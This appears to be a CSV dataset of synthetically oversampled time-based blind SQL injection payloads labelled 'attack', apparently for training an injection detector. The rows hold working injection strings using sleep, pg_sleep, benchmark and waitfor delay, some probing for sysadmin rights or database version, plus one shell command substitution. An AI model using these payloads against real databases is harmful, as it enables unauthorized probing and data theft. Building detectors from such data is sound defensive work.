id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000539,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",nearest_attack_euclidean,R000076,1.28646377154445
SMOTE_000540,attack,time,1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000060,0.8617635896469226
SMOTE_000541,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.45708055962147637
SMOTE_000542,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,1.1581105867702617
SMOTE_000543,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.951003071462114
SMOTE_000544,attack,time,"1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000051,0.26511658384302206
SMOTE_000545,attack,time,"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000064,0.03693502935767279
SMOTE_000546,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,0.11662342262202893
SMOTE_000547,attack,time,"1'||  (  select 'kojx' from dual where 8140  =  8140 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000061,0.3468646195143382
SMOTE_000548,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,2.5967033981165377
SMOTE_000549,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,0.697646564198668
SMOTE_000550,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",nearest_attack_euclidean,R000076,1.0398071014419428
SMOTE_000551,attack,time,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000077,3.203839854174981
SMOTE_000552,attack,time,"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000064,1.4959078808012816
SMOTE_000553,attack,time,"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000044,0.11352908954364266
SMOTE_000554,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,1.4169324957168343
SMOTE_000555,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,0.023846706083937737
SMOTE_000556,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.9579495852998366
SMOTE_000557,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,0.47542505334565144
SMOTE_000558,attack,time,1   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000048,0.9514798729243011
SMOTE_000559,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.40777504785107427
SMOTE_000560,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,2.157186956237495
SMOTE_000561,attack,time,"1',  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )   ",nearest_attack_euclidean,R000043,5.433514575821267
SMOTE_000562,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.7453766735487867
SMOTE_000563,attack,time,"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000067,2.071042872849282
SMOTE_000564,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.553593937981908
SMOTE_000565,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.08331276372730517
SMOTE_000566,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,1.7550183549515974
SMOTE_000567,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,1.7450541695593909
SMOTE_000568,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,0.1299128189943039
SMOTE_000569,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,1.194518236049079
SMOTE_000570,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,1.3917646631907483
SMOTE_000571,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,1.703091592649727
SMOTE_000572,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,0.9327063689444943
SMOTE_000573,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.752085450306464
SMOTE_000574,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,1.0374321677041027
SMOTE_000575,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.7445940731286121
SMOTE_000576,attack,time,""" or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000040,1.8651606561380227
SMOTE_000577,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,0.7486827451060358
SMOTE_000578,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.8117599590830545
SMOTE_000579,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.37878953642055313
SMOTE_000580,attack,time,1'  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000068,1.1036699832005488
SMOTE_000581,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,0.18945288570436686
SMOTE_000582,attack,time,"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000064,2.2667921195560425
SMOTE_000583,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.3645817831660942
SMOTE_000584,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,2.9482178830637547
SMOTE_000585,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,1.3308296229454466
SMOTE_000586,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,0.9446867971364781
SMOTE_000587,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.3840343592670594
SMOTE_000588,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,1.6935915527578993
SMOTE_000589,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.9102751442276141
SMOTE_000590,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,2.0905120507340573
SMOTE_000591,attack,time,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000077,2.475652631434556
SMOTE_000592,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.014930626597357909
SMOTE_000593,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,2.0298856835348325
SMOTE_000594,attack,time,"1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000078,1.2590356733771277
SMOTE_000595,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.6033075526457857
SMOTE_000596,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,0.8196758875472586
SMOTE_000597,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,1.364067845134446
SMOTE_000598,attack,time,"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000067,2.1447608212621674
SMOTE_000599,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.9906940029090696
SMOTE_000600,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,0.14754253419215602
SMOTE_000601,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.22279365948370058
SMOTE_000602,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.08902577225940436
SMOTE_000603,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",nearest_attack_euclidean,R000076,1.7698354332796584
SMOTE_000604,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.2557603260160645
SMOTE_000605,attack,time,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,1.9983018165747697
SMOTE_000606,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,1.1408999916494724
SMOTE_000607,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.6691139044869941
SMOTE_000608,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,0.9452343266701639
SMOTE_000609,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,0.7354879472965602
SMOTE_000610,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.5514009664809385
SMOTE_000611,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,2.193985906811093
SMOTE_000612,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",nearest_attack_euclidean,R000046,1.735419990381487
SMOTE_000613,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,2.297867553209798
SMOTE_000614,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,0.12335004222398838
SMOTE_000615,attack,time,1'  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000068,1.3895531528590803
SMOTE_000616,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.9716883640730852
SMOTE_000617,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.5726363303898188
SMOTE_000618,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,0.9383579500197121
SMOTE_000619,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,0.7479547631285792
SMOTE_000620,attack,time,1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000060,1.7220608536992934
SMOTE_000621,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,1.701668983273522
SMOTE_000622,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,2.712060029107999
SMOTE_000623,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,1.9708346819702687
SMOTE_000624,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,0.4755243024376536
SMOTE_000625,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,1.2039331790873198
SMOTE_000626,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,1.5922523910405781
SMOTE_000627,attack,time,"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000067,2.4793610080551263
SMOTE_000628,attack,time,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000077,2.49836211574233
SMOTE_000629,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.8497456499539838
SMOTE_000630,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.1574169896246225
SMOTE_000631,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.3187808975728298
SMOTE_000632,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0
SMOTE_000633,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,0.21544981610873765
SMOTE_000634,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,0.8722903412431606
SMOTE_000635,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.20876347863918746
SMOTE_000636,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,1.6296612722744754
SMOTE_000637,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.8335252555911447
SMOTE_000638,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.4635430270348505
SMOTE_000639,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,1.7787106754036992
SMOTE_000640,attack,time,"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000067,0.41862703265715845
SMOTE_000641,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,2.0351314915298824
SMOTE_000642,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,0.6654160266579046
SMOTE_000643,attack,time,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,2.4307624268099612
SMOTE_000644,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,1.0720189656359576
SMOTE_000645,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,0.9665905597030703
SMOTE_000646,attack,time,"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000064,0.971587680187283
SMOTE_000647,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,2.196756441043449
SMOTE_000648,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,0.2746408508184002
SMOTE_000649,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,1.7893906071250276
SMOTE_000650,attack,time,"1""  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000075,2.236090586994484
SMOTE_000651,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.642377683045245
SMOTE_000652,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,0.19033449213693554
SMOTE_000653,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,1.0831631865141316
SMOTE_000654,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,0.3644362496574618
SMOTE_000655,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.0986912353569014
SMOTE_000656,attack,time,""" or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000040,0.8807413303127307
SMOTE_000657,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,1.8762663689256844
SMOTE_000658,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,0.11810356405278058
SMOTE_000659,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.06655928316941472
SMOTE_000660,attack,time,"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000064,1.1418984453735292
SMOTE_000661,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.001049411668117
SMOTE_000662,attack,time,"1'||  (  select 'kojx' from dual where 8140  =  8140 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000061,2.8982149248262004
SMOTE_000663,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.14986322515135292
SMOTE_000664,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.49930351272171974
SMOTE_000665,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.006359536737765492
SMOTE_000666,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,0.6319537805083748
SMOTE_000667,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.1737837064768868
SMOTE_000668,attack,time,"1""   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000052,0.6612881555412218
SMOTE_000669,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.6710125793428232
SMOTE_000670,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.44459396605135854
SMOTE_000671,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,0.26309168465667293
SMOTE_000672,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,1.8388281324390925
SMOTE_000673,attack,time,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,1.0053261213021076
SMOTE_000674,attack,time,"1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000078,1.4094467235289665
SMOTE_000675,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,1.771020915818213
SMOTE_000676,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,1.789500625855705
SMOTE_000677,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,2.8849124066973784
SMOTE_000678,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,1.1468420429756008
SMOTE_000679,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.613746796687736
SMOTE_000680,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,0.43283072826917907
SMOTE_000681,attack,time,"1""  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000075,1.8288389431653818
SMOTE_000682,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,0.9557012331775737
SMOTE_000683,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.45641759748705474
SMOTE_000684,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.006383430579772672
SMOTE_000685,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,0.9233243298484572
SMOTE_000686,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.5282969051949945
SMOTE_000687,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,0.6610586041464928
SMOTE_000688,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.5095637060249024
SMOTE_000689,attack,time,"1',  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )   ",nearest_attack_euclidean,R000043,1.4869974281222345
SMOTE_000690,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.05861923419299695
SMOTE_000691,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,0.018178890370349206
SMOTE_000692,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,0.12729264963449677
SMOTE_000693,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.4705082824802598
SMOTE_000694,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.777673270189181
SMOTE_000695,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.03906125985773109
SMOTE_000696,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,0.21070915074208202
SMOTE_000697,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.350337278955924
SMOTE_000698,attack,time,"1',  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )   ",nearest_attack_euclidean,R000043,2.4543859511253285
SMOTE_000699,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.240276500491469
SMOTE_000700,attack,time,"1""  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000075,0.6808921151963748
SMOTE_000701,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.3839631136072032
SMOTE_000702,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,0.3387112498552677
SMOTE_000703,attack,time,1   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000048,1.0858457814672422
SMOTE_000704,attack,time,1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000060,0.8679389075301694
SMOTE_000705,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.006881782974692571
SMOTE_000706,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.4764771107449025
SMOTE_000707,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.8204817907220733
SMOTE_000708,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,1.5482118528628022
SMOTE_000709,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.06916827272711625
SMOTE_000710,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,1.7237078130915424
SMOTE_000711,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,2.1976060715264953
SMOTE_000712,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.12592613121121182
SMOTE_000713,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,0.17291387888919513
SMOTE_000714,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.31237908890333566
SMOTE_000715,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,0.444137809116865
SMOTE_000716,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,2.3762689110552153
SMOTE_000717,attack,time,"1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000051,1.1011129841428509
SMOTE_000718,attack,time,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,1.5997525684754779
SMOTE_000719,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.12980006233750316
SMOTE_000720,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.12782934717003588
SMOTE_000721,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.0223418641259003
SMOTE_000722,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.5674702042737776
SMOTE_000723,attack,time,1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000059,2.725293598653853
